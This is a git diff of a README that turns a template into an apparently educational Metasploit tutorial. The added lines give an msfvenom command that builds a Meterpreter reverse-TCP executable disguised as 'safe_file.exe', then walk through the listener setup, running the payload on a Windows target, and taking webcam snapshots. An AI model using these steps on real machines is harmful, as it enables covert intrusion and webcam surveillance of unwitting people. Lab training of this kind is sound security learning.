@@ -1,6 +1,6 @@
 <h1> Metasploit - Reverse Shell Tutorial</h1>
 
- ### [YouTube Demonstration](https://youtu.be/7eJexJVCqJo) CHANGE THIS 
+ ### [YouTube Demonstration](https://youtu.be/sh0AUBFdQQE) Easy Walkthrough
 
 <h2>Description</h2>
 🔒 Explore a project which practically demonstrates exploiting a Windows 11 vulnerability using Metasploit to gain webcam access and establish a reverse shell payload. This repository showcases the exploit code and demonstrates its execution step-by-step. Dive into the world of cybersecurity with this educational project. 
@@ -20,33 +20,43 @@
 
 <p align="center">
 
-Launch the utility: <br/>
-CHANGE THIS 
-<img src="https://i.imgur.com/62TgaWL.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Launch the Terminal: <br/>
+<img src="https://i.imgur.com/1q88XYz.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Select the disk:  <br/>
-<img src="https://i.imgur.com/tcTyMUE.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Find windows/x64/meterpreter_reverse_tcp:  <br/>
+<img src="https://i.imgur.com/9OXqG5n.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Enter the number of passes: <br/>
-<img src="https://i.imgur.com/nCIbXbg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Create the payload using msfvenom. <br /> Commnad = "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= <your attacking machines IP address> lport=4242 (your preferred port) <br />-f exe -o safe_file.exe": <br/>
+<img src="https://i.imgur.com/gYbl7xu.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Confirm your selection:  <br/>
-<img src="https://i.imgur.com/cdFHBiU.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Launch metasploit framework & get set up using your desired Payload along with <br />your attacking IP address, Port & set the listener:
+<img src="https://i.imgur.com/uFiqNxm.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Wait for process to complete (may take some time):  <br/>
-<img src="https://i.imgur.com/JL945Ga.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Transport your payload (safe_file) to the Target machine (Windows) & EXECUTE!:  <br/>
+<img src="https://i.imgur.com/B1k9R6L.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Sanitization complete:  <br/>
-<img src="https://i.imgur.com/K71yaM2.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Metasploit Listener has caught the Reverseshell:  <br/>
+<img src="https://i.imgur.com/wGdePzq.png" height="80%" width="80%" alt="ReverseShell Steps"/>
 <br />
 <br />
-Observe the wiped disk:  <br/>
-<img src="https://i.imgur.com/AeZkvFQ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+Once we have access to the targets machine, we can access all sorts of information. In this case, I will run the <br />command = "webcam_list" to see if there are any avaliable webcams we can capture from:  <br/>
+<img src="https://i.imgur.com/DqHcUYk.png" height="80%" width="80%" alt="ReverseShell Steps"/>
+<br />
+There are two webcams we can access on the target machine. We will now run the command "webcam_snap -i 1" to <br />
+select webcam 1 and capture an image:  <br/>
+<img src="https://i.imgur.com/V84fQAN.png" height="80%" width="80%" alt="ReverseShell Steps"/>
+<br />
+<br />
+And there we have it, we have gained access to the targets webcam: <br/>
+<img src="https://i.imgur.com/cwzAXW9.png" height="80%" width="80%" alt="ReverseShell Steps"/>
+<br />
+
+
 </p>
 
 <!--
